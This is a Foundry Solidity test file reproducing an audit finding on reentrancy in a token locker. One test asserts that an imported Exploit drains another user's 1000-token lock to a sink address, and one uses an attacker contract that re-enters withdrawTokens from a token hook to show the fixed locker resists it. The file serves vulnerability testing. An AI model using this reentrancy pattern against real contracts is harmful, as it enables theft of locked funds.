// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    HookToken,
    LockTokenFixed,
    NftBurn,
    VictimLocker
} from "./57521-reentrancy-in-main-functions-zokyo-none-trustswap-markdown.sol";

contract Finding57521Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_reenter_withdraw_drains_other_lock() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.stolen(), 1000 ether, "stolen");
        assertEq(e.token().balanceOf(SINK), 1000 ether, "sink");
        assertEq(e.token().balanceOf(address(e.locker())), 0, "pool drained");
        assertEq(e.token().balanceOf(address(e)), 1000 ether, "attacker keeps own principal");
    }

    function test_control_effects_before_call_keeps_victim_lock() public {
        HookToken token = new HookToken();
        NftBurn nft = new NftBurn();
        LockTokenFixed locker = new LockTokenFixed(token, nft);
        VictimLocker victim = new VictimLocker();
        ControlAttacker attacker = new ControlAttacker(token, locker);
        token.mint(address(attacker), 1000 ether);
        token.mint(address(victim), 1000 ether);
        attacker.lock(1000 ether);
        victim.approveAndLock(token, address(locker), 1000 ether);
        attacker.go();
        assertEq(token.balanceOf(address(attacker)), 1000 ether, "only own deposit");
        assertEq(token.balanceOf(address(locker)), 1000 ether, "victim lock intact");
        assertEq(token.balanceOf(SINK), 0, "nothing stolen");
    }
}

contract ControlAttacker {
    HookToken public token;
    LockTokenFixed public locker;
    uint256 public id;
    bool internal entered;

    constructor(HookToken _token, LockTokenFixed _locker) {
        token = _token;
        locker = _locker;
    }

    function lock(uint256 amount) external {
        token.approve(address(locker), type(uint256).max);
        id = locker.lockTokens(amount);
    }

    function go() external {
        token.arm(1);
        locker.withdrawTokens(id);
    }

    function onTokensReceived() external {
        if (entered) return;
        entered = true;
        try locker.withdrawTokens(id) {} catch {}
    }
}
